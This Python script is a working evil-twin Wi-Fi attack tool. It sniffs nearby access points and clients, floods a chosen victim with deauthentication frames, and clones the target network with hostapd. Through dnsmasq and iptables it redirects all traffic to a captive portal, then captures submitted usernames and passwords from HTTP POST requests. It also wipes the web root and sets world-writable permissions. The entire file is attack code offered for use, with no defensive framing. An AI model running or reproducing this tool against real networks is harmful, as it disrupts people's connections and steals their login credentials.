import argparse
import fcntl
import os
import signal
import sys
import urllib.parse
import getmac
from getmac import get_mac_address
from progress.bar import IncrementalBar, ShadyBar, PixelBar, Bar, FillingSquaresBar, ChargingBar, FillingCirclesBar
from progress.spinner import Spinner, MoonSpinner, PixelSpinner, PieSpinner, LineSpinner
from scapy.all import *
import time
import netifaces
from scapy.layers.dhcp import DHCP
from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, Dot11ProbeReq
from scapy.layers.http import HTTPRequest
from scapy.layers.l2 import Ether
stop_thread = False
interface = ''
mac = ''
victim = ''
client_AP = dict()
AP = {}
php_version = 7.4
from_ch = ''
connected_stations = dict()
presentation = '''

  ______           _   _     _______              _         
 |  ____|         (_) | |   |__   __|            (_)        
 | |__    __   __  _  | |      | |    __      __  _   _ __  
 |  __|   \ \ / / | | | |      | |    \ \ /\ / / | | | '_ \ 
 | |____   \ V /  | | | |      | |     \ V  V /  | | | | | |
 |______|   \_/   |_| |_|      |_|      \_/\_/   |_| |_| |_|

'''


# progressbar
def progress():
    bar_cls = FillingCirclesBar

    bar = bar_cls('loading')
    for i in bar.iter(range(200, 400)):
        sleep()


def sleep():
    t = 0.01
    t += t * random.uniform(-0.1, 0.1)  # Add some variance
    time.sleep(t)


# parse argument variables
def arg_parse():
    parser = argparse.ArgumentParser(description='EvilTwin wireless attack.')
    parser.add_argument('-i', '--interface', type=str, required=True,
                        help='Name of the wireless interface you want to sniff packets on')
    parser.add_argument('-c', '--channels', required=False, nargs=2, type=str,
                        help='choose the channel range of which to sniff on')
    parser.add_argument('-n', '--count', required=True, type=int,
                        help='specify how many deauth frames to send')

    args = vars(parser.parse_args())
    if args['interface'] not in netifaces.interfaces():
        print('Interface not found.')
        sys.exit()

    return args['interface'], args['channels'], args['count']


# switch interface to monitor mode
def monitor_mode(iface):
    try:
        os.system('ifconfig ' + str(iface) + ' down')
        os.system('iwconfig ' + str(iface) + ' mode monitor')
        os.system('ifconfig ' + str(iface) + ' up')
    except:
        print("Make sure that this interface " + iface + " supports monitor mode")


def add_ap(pkt):
    global from_ch
    global AP
    ssid = pkt[Dot11Beacon].network_stats()['ssid']

    bssid = pkt[Dot11].addr3.lower()  # ap mac address
    ap_channel = str(from_ch)
    if bssid in AP:
        return
    else:
        AP[bssid] = {}
        AP[bssid]['channel'] = ap_channel
        AP[bssid]['ESSID'] = ssid


def add_client(pkt):
    global AP
    global client_AP
    ds = pkt.FCfield & 0x3  # frame control
    to_ds = ds & 0x01 != 0
    from_ds = ds & 0x2 != 0
    addr2 = pkt[Dot11].addr2.lower()
    addr1 = pkt[Dot11].addr1.lower()

    # reciever is bssid and transmitter is client
    if to_ds and not from_ds:
        if addr1 in AP:
            if addr2 not in client_AP:
                client_AP[addr2] = {}
                client_AP[addr2]['ESSID'] = AP[addr1]['ESSID']
                client_AP[addr2]['channel'] = AP[addr1]['channel']
                client_AP[addr2]['BSSID'] = addr1.lower()

            elif addr1 not in client_AP[addr2]['BSSID']:
                client_AP[addr2]['ESSID'] = AP[addr1]['ESSID']
                client_AP[addr2]['channel'] = AP[addr1]['channel']
                client_AP[addr2]['BSSID'] = addr1.lower()

            # transmitter is bssid and receiver is client
        if from_ds and not to_ds:
            if addr2 in AP:
                if addr1 not in client_AP:
                    client_AP[addr1] = {}
                    client_AP[addr1]['ESSID'] = AP[addr2]['ESSID']
                    client_AP[addr1]['channel'] = AP[addr2]['channel']
                    client_AP[addr1]['BSSID'] = addr2.lower()

                elif addr2 not in client_AP[addr1]['BSSID']:
                    client_AP[addr1]['ESSID'] = AP[addr2]['ESSID']
                    client_AP[addr1]['channel'] = AP[addr2]['channel']
                    client_AP[addr1]['BSSID'] = addr2.lower()


# ignore broadcasts from APs
def noise_filter(addr1, addr2):
    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:',
              mac]

    for i in ignore:
        if i in addr1 or i in addr2:
            return True


def handler(pkt):
    if pkt.haslayer(Dot11):

        if pkt.haslayer(Dot11Beacon):  # AP
            add_ap(pkt)

        elif pkt.addr1 and pkt.addr2:
            pkt.addr1 = pkt.addr1.lower()
            pkt.addr2 = pkt.addr2.lower()

            if noise_filter(pkt.addr1, pkt.addr2):
                return

        if pkt.type == 2:  # Data frames
            add_client(pkt)


# mac address of the interface on monitor mode
def mon_mac(mon_iface):
    mon = get_mac_address(interface=mon_iface)
    return mon


def sniffer(iface, ch):
    global from_ch
    if ch:
        if int(ch[0]) not in range(1, 14) and int(ch[1]) not in range(1, 14):
            print("Invalid channels. Channels should be between 1 and 14")
            sys.exit()
        if int(ch[0]) > int(ch[1]):
            from_ch = int(ch[1])
            to_ch = int(ch[0])
        else:
            from_ch = int(ch[0])
            to_ch = int(ch[1])
    else:
        from_ch = 1
        to_ch = 14
    timeout = time.time() + 60  # a minute  from now
    while True:
        os.system("iwconfig " + iface + " channel " + str(from_ch))  # switch channel
        sniff(prn=handler, iface=iface, timeout=1)
        from_ch = from_ch % to_ch + 1
        if time.time() > timeout:
            break


def output():
    dash = '-' * 120
    global AP
    print(dash)
    print('{:<40s}{:>40s}{:>30s}'.format('ESSID', 'CH', 'Access Points'))
    print(dash)
    for i in AP:
        ssid = AP[i]['ESSID']
        print('{:<40s}{:>40s}{:^50s}'.format(ssid, AP[i]['channel'], i))
    print('\n')


# display a progress bar for aesthetics
def progressbar():
    bar_cls = IncrementalBar
    suffix = '%(percent)d%% [%(elapsed_td)s / %(eta)d / %(eta_td)s]'
    with bar_cls('Scanning', suffix=suffix, max=100) as bar:
        for i in range(100):
            bar.next()
            time.sleep(0.6)


# output the stations of chosen network
def output_client(net):
    global client_AP

    dash = '-' * 80
    print(dash)
    print('{:<20s}{:>10s}{:>25s}{:>25s}'.format('Stations', 'CH', 'ESSID', 'BSSID'))
    print(dash)
    for i in client_AP:
        if client_AP[i]['BSSID'] == net:
            print('{:<20s}{:>10s}{:^35s}{:>20}'.format(i, client_AP[i]['channel'], client_AP[i]['ESSID'],
                                                       client_AP[i]['BSSID']))


def deauth(target_mac, iface, count):
    global client_AP
    bssid = client_AP[target_mac]['BSSID']
    dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid)
    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
    print("[+] started deauth attack...")
    sendp(frame, iface=iface, loop=1, inter=.1, verbose=0)


def configHostapd(iface, net):
    global AP
    # Hostapd configuration
    os.system("service hostapd stop")
    print('[+] Configuring hostapd...')
    hostapdConfigFile = 'hostapd.conf'
    hostapdLogFile = 'hostapd.log'

    hostapdConfig = ''
    hostapdConfig += 'interface=' + iface + '\n'  # Interface used
    hostapdConfig += 'driver=nl80211\n'  # Driver interface type
    hostapdConfig += 'ssid=' + AP[net]['ESSID'] + '\n'  # SSID
    hostapdConfig += 'hw_mode=g\n'  # Hardware mode (802.11g)
    hostapdConfig += 'channel=' + AP[net]['channel'] + '\n'  # Channel
    f = open(hostapdConfigFile, 'w')
    f.write(hostapdConfig)
    f.close()

    # Hostapd initialization
    os.system('hostapd -B ' + hostapdConfigFile)
    print('[+] hostapd successfully configured')


def configDnsmasq(iface):
    # Stop dnsmasq  in case it's active
    os.system('service dnsmasq stop')
    # Flush iptables to avoid conflicts
    print('[-] Flushing iptables...')
    os.system('iptables -F')
    os.system('iptables -t nat -F')
    print('[+] Iptables flushed')
    # Config dnsmasq
    dnsmasqConfigFile = 'dnsmasq.conf'
    dnsmasqConfig = ''
    print('[+] Configuring dnsmasq...')
    dnsmasqConfig += 'interface=' + iface + '\n'  # Interface in which dnsmasq listen
    dnsmasqConfig += 'dhcp-range=192.168.1.10,192.168.1.250,255.255.255.0,12h\n'  # Range of IPs to set to clients for the DHCP server
    dnsmasqConfig += 'dhcp-option=3,192.168.1.1\n'  # Set router to 192.168.1.1
    dnsmasqConfig += 'dhcp-option=6,192.168.1.1\n'  # Set dns server to 192.168.1.1
    dnsmasqConfig += 'address=/#/192.168.1.1\n'  # Response to every DNS query with 192.168.1.1 (where our captive portal is)
    dnsmasqConfig += 'address=/www.google.com/216.58.209.2\n'
    f = open(dnsmasqConfigFile, 'w')
    f.write(dnsmasqConfig)
    f.close()

    # Set inet address of interface to 192.168.1.1
    os.system('ifconfig ' + iface + ' 192.168.1.1 netmask 255.255.255.0')
    # route http traffic to captive portal page
    os.system(
        'iptables -t nat -A PREROUTING -p tcp -m tcp -s 192.168.1.0/24 --dport 80 -j DNAT --to-destination 192.168.1.1')
    # route https traffic to captive portal page
    os.system(
        'iptables -t nat -A PREROUTING -p tcp -m tcp -s 192.168.1.0/24 --dport 443 -j DNAT --to-destination 192.168.1.1')
    # Initialize dnsmasq
    os.system('dnsmasq -C ' + dnsmasqConfigFile)
    print('[+] dnsmasq successfully configured')


def config_portal():
    # Config captive portal files
    print('[+] Copying web files...')
    os.system('rm -r /var/www/html/* 2>/dev/null')  # delete all folders and files in this directory
    os.system('cp -r captiveportal/* /var/www/html')
    os.system('chmod 777 /var/www/html/*')
    os.system('chmod 777 /var/www/html')
    print('[+] Web files copied succesfuly')

    # Enable rewrite and override for .htaccess and php
    print('[+] Configuring apache2...\n')
    os.system('cp -f 000-default.conf /etc/apache2/sites-enabled/')
    os.system('a2enmod rewrite')
    os.system('a2enmod php' + str(php_version))
    # reload and restart apache2
    os.system('service apache2 restart')
    print('[+] apache2 configured successfully\n')


def station_handler(pkt):
    global connected_stations
    # dhcp offer:
    if DHCP in pkt and pkt[DHCP].options[0][1] == 2 and pkt.getlayer(Ether).dst not in connected_stations:
        connected_stations[pkt.getlayer(Ether).dst] = '1'
        print("[+]", pkt.getlayer(Ether).dst, " has connected to our access point")

    if pkt.haslayer(HTTPRequest):
        method = pkt[HTTPRequest].Method.decode()
        if method == 'POST' and pkt.haslayer(Raw):
            if 'Uname' in str(pkt[Raw].load) and 'Pass' in str(pkt[Raw].load):
                print("[+] ", pkt.getlayer(Ether).src, " has logged in " + str(urllib.parse.parse_qs(pkt[Raw].load)) +
                                                       " added to /var/www/html/captiveportal/passwords.txt")


def sniff_dhcp(iface):
    sniff(iface=iface, filter='port 80 or (udp and (port 67 or port 68))', prn=station_handler)


def sig_handler(signum, frame):
    global interface
    global stop_thread
    os.system("killall dnsmasq")
    os.system("killall hostapd")
    os.system('iptables -F')
    os.system('iptables -t nat -F')
    os.system("iw dev mon0 del")
    # os.system("ifconfig " + str(interface) + " 10.0.0.12")
    os.system("rm dnsmasq.conf")
    os.system("rm hostapd.conf")

    print("Bye")
    sys.exit()


if __name__ == "__main__":
    interface, channel, count = arg_parse()
    print(presentation)
    progress()
    os.system('clear')
    time.sleep(1)
    os.system("iw dev " + interface + " interface add mon0 type monitor")
    os.system("ifconfig mon0 up")
    monitor_mode(interface)
    mac = mon_mac(interface)
    print("[+]Interface switched to monitor mode")
    time.sleep(1)
    print("[+]Sniffing packets this will take a minute")
    time.sleep(1)
    progbar = Thread(target=progressbar)
    progbar.start()
    sniffer(interface, channel)
    time.sleep(1)
    os.system('clear')
    output()
    network = input("enter the mac address of the network you want to attack: ")

    while network.lower() not in AP:
        network = input("AP not found choose one form the list please: ")

    output_client(network)
    victim = input("enter the mac address of the station you want to attack: ")
    while victim.lower() not in client_AP and victim.lower() != 'ff:ff:ff:ff:ff:ff':
        victim = input("station not found choose one from the list please: ")
    time.sleep(1)
    config_portal()
    os.system("iwconfig mon0 " + " channel " + str(client_AP[victim]['channel']))
    time.sleep(1)
    configHostapd(interface, network)
    time.sleep(1)
    configDnsmasq(interface)
    Thread(target=deauth, args=(victim, 'mon0', count)).start()

    time.sleep(1)
    signal.signal(signal.SIGINT, sig_handler)
    print("[+]scanning activities in our access point if you want to stop press ctrl-c...")
    sniff_dhcp(interface)
